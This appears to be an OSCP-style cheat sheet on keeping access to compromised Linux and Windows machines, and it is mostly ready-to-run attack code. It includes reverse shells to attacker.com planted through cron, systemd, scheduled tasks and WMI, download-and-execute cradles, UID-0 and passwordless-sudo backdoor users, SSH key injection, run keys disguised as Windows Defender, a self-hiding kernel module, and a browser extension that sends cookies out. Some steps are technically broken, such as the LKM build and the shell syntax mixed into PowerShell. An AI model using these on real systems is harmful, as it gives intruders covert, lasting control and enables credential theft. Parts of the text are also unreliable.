# Persistence Techniques

**Source:** OSCP & Penetration Testing Best Practices

## Quick Intro

- Maintain access after initial exploitation
- Survive reboot/process restart
- Avoid detection while persistent
- Escalate from user → admin/root before persistence
- Test persistence regularly (reboot, service restart)

## SSH Backdoor (Linux)

### Authorized Keys Injection

```bash
# Add attacker SSH public key to user's authorized_keys
echo "ssh-rsa AAAA... attacker@desktop" >> ~/.ssh/authorized_keys

# As root, inject into multiple users
for user in root admin ubuntu www-data; do
  echo "ssh-rsa AAAA... attacker@desktop" >> /home/$user/.ssh/authorized_keys 2>/dev/null
done

# Set correct permissions (critical)
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Connect later
ssh -i /path/to/private_key user@target
```

### SSH Root User Creation

```bash
# Create new user with specific UID/GID for bypass
useradd -m -s /bin/bash -u 0 backdoor

# Set password
echo "backdoor:password123" | chpasswd

# Verify UID is 0 (root)
id backdoor

# Connect as root without password
ssh backdoor@target
```

### SSH Key Pair Generation & Injection

```bash
# Generate key pair on attacker
ssh-keygen -t rsa -N "" -f /tmp/id_rsa

# Inject public key into target
cat /tmp/id_rsa.pub >> /home/user/.ssh/authorized_keys

# Connect from attacker
ssh -i /tmp/id_rsa user@target
```

### Cron Job Reverse Shell

```bash
# Add to crontab (runs every 5 minutes)
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -

# Or via direct crontab edit
crontab -e
# Add: */5 * * * * /tmp/reverse_shell.sh

# Create reverse shell script
cat > /tmp/reverse_shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
EOF
chmod +x /tmp/reverse_shell.sh

# Verify cron job
crontab -l
```

## Windows Scheduled Task Persistence

### PowerShell Reverse Shell Scheduled Task

```powershell
# Create action with reverse shell payload
$action = New-ScheduledTaskAction -Execute 'powershell' `
  -Argument '-nop -w hidden -c "$client=New-Object System.Net.Sockets.TCPClient(''attacker.com'',4444);$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($i=$stream.Read($buffer,0,$buffer.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+''PS ''+pwd.Path+''> '';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'

# Trigger on system startup
$trigger = New-ScheduledTaskTrigger -AtStartup

# Register task
Register-ScheduledTask -Action $action -Trigger $trigger `
  -TaskName "WindowsUpdate" -Description "Windows Updates" `
  -RunLevel Highest -Force

# Verify task registered
Get-ScheduledTask -TaskName "WindowsUpdate" | Select-Object -Property State, Actions
```

### Command Execution Scheduled Task

```powershell
# Simpler task: execute command every hour
$action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c powershell -c IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemMaintenance" -RunLevel Highest
```

## User Account Backdoor

### Local Administrator Creation

```powershell
# Create hidden admin user (Windows)
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add

# Verify
net user backdoor
net localgroup administrators

# Hide from login screen (optional registry tweak)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /d "backdoor" /f
```

### Linux Sudo No-Password User

```bash
# Create user
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Add to sudoers without password prompt
echo "backdoor ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Or edit via visudo (safer)
visudo
# Add: backdoor ALL=(ALL) NOPASSWD: ALL

# Test
sudo -u backdoor whoami  # Should return root
```

## Rootkit & Kernel Module Persistence

### LKM (Loadable Kernel Module) - Linux

```bash
# Simple LKM rootkit structure
cat > rootkit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("attacker");
MODULE_DESCRIPTION("Simple rootkit");

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded!\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit unloaded!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
EOF

# Compile LKM
gcc -c -Wall -Wextra rootkit.c -o rootkit.o

# Load module into kernel
insmod rootkit.o

# Verify loaded
lsmod | grep rootkit

# Unload (admin can still do this)
rmmod rootkit
```

### Kernel Module Hiding

```c
// Advanced LKM to hide itself from lsmod
#include <linux/module.h>
#include <linux/list.h>

static int __init hide_module(void) {
    list_del(&THIS_MODULE->list);  // Remove from module list
    return 0;
}

module_init(hide_module);
```

## Boot Loader Modification (Linux)

### GRUB Backdoor

```bash
# Backup current GRUB config
cp /boot/grub/grub.cfg /boot/grub/grub.cfg.bak

# Add new boot entry with custom initramfs (advanced persistence)
# Or modify kernel parameters to load rootkit module

# Set default boot entry (if multi-boot)
grub-set-default 0

# Update GRUB
update-grub

# Verify changes
grep -i "linux" /boot/grub/grub.cfg | head -5
```

## Registry Run Keys (Windows)

### HKLM Run Key Persistence

```powershell
# Add program to run at startup for all users
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" `
  /v "Windows Defender" `
  /d "C:\Windows\System32\evil.exe" `
  /f

# Or via PowerShell
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "Windows Defender" `
  -Value "C:\Windows\System32\evil.exe" `
  -Force
```

### HKCU Run Key Persistence (User-Level)

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" `
  /v "OneDrive" `
  /d "C:\Users\Public\evil.exe" `
  /f
```

## WMI Event Subscription (Windows)

### Permanent Command Execution via WMI

```powershell
# Create WMI event trigger (executes every 2 minutes)
$filterName = "WindowsEventFilter"
$consumerName = "WindowsEventConsumer"
$filterPath = "\\.\root\subscription:__EventFilter.Name='$filterName'"
$consumerPath = "\\.\root\subscription:CommandLineEventConsumer.Name='$consumerName'"

# Create event filter
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
  -Arguments @{Name=$filterName;EventNamespace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"}

# Create consumer (command to execute)
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
  -Arguments @{Name=$consumerName;ExecutablePath="C:\Windows\System32\cmd.exe";CommandLineTemplate="/c powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
  -Arguments @{Filter=$filter;Consumer=$consumer}

# Verify
Get-WmiObject __EventFilter -Namespace root\subscription
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription
```

## Service Installation (Windows/Linux)

### Windows Service Persistence

```powershell
# Create executable that acts as service (or use existing vulnerable service)
# Use sc.exe to register new service

# Create service pointing to malicious binary
sc create PersistentService binPath= "C:\Windows\System32\evil.exe"

# Set service to auto-start
sc config PersistentService start= auto

# Start service
net start PersistentService

# Verify
sc query PersistentService
Get-Service -Name PersistentService
```

### Linux Systemd Service

```bash
# Create systemd service file
cat > /etc/systemd/system/persistence.service << 'EOF'
[Unit]
Description=System Maintenance Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/maintenance.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Create executable script
cat > /usr/local/bin/maintenance.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
EOF
chmod +x /usr/local/bin/maintenance.sh

# Enable and start service
systemctl enable persistence.service
systemctl start persistence.service

# Verify
systemctl status persistence.service
```

## DLL Injection (Windows)

### Process Hollowing via DLL

```powershell
# Create malicious DLL
# Compile: msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f dll > evil.dll

# Place DLL where vulnerable application expects it
# Copy evil.dll to directory where legit app imports missing DLL

# Trigger injection by starting vulnerable application
C:\Program Files\VulnerableApp\app.exe

# Alternative: Manually inject DLL into running process
$proc = Get-Process explorer
$handle = [System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices').GetType('System.Runtime.InteropServices.Marshal')
# Advanced: Use Invoke-ReflectivePEInjection (PowerShell Empire)
```

## Browser Persistence

### Browser Extension Hijacking (Chrome)

```powershell
# Modify Chrome extension manifest for persistence
$chromeExtDir = "$env:APPDATA\Google\Chrome\User Data\Default\Extensions\"

# Create malicious extension
mkdir C:\malicious_extension
cat > C:\malicious_extension\manifest.json << 'EOF'
{
  "manifest_version": 3,
  "name": "Auto Update",
  "version": "1.0",
  "permissions": ["activeTab"],
  "background": {
    "service_worker": "background.js"
  }
}
EOF

cat > C:\malicious_extension\background.js << 'EOF'
fetch('http://attacker.com/?cookies=' + document.cookie);
EOF

# Copy to Chrome extensions directory
Copy-Item C:\malicious_extension -Destination $chromeExtDir -Recurse
```

## Systemd Timer (Linux)

### Recurring Command via Systemd Timer

```bash
# Create service unit
cat > /etc/systemd/system/persistence.service << 'EOF'
[Unit]
Description=Persistent Reverse Shell
After=network.target

[Service]
Type=oneshot
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
EOF

# Create timer unit (runs every 10 minutes)
cat > /etc/systemd/system/persistence.timer << 'EOF'
[Unit]
Description=Persistent Timer
Requires=persistence.service

[Timer]
OnBootSec=5min
OnUnitActiveSec=10min
Persistent=true

[Install]
WantedBy=timers.target
EOF

# Enable and start
systemctl enable persistence.timer
systemctl start persistence.timer

# Verify
systemctl list-timers persistence.timer
```

## Detection & Testing Checklist

- [x] SSH authorized_keys backdoor
- [x] SSH new user (UID 0) creation
- [x] SSH key pair injection
- [x] Cron job reverse shell
- [x] Windows scheduled task (startup trigger)
- [x] Windows scheduled task (recurring)
- [x] Local admin user creation
- [x] Linux sudo backdoor user
- [x] Loadable Kernel Module (LKM)
- [x] LKM hiding (list_del)
- [x] GRUB boot loader modification
- [x] Windows Run key (HKLM/HKCU)
- [x] WMI event subscription
- [x] Windows service installation
- [x] Linux systemd service
- [x] DLL injection/process hollowing
- [x] Browser extension hijacking
- [x] Systemd timer persistence
- [x] Verify persistence after reboot
- [x] Verify persistence after process restart

## Related Notes

- [[04-Privilege-Escalation]] → Escalate before persistence
- [[06-Exploitation]] → Initial access prerequisites
- [[09-Covering-Tracks]] → Hide persistence artifacts
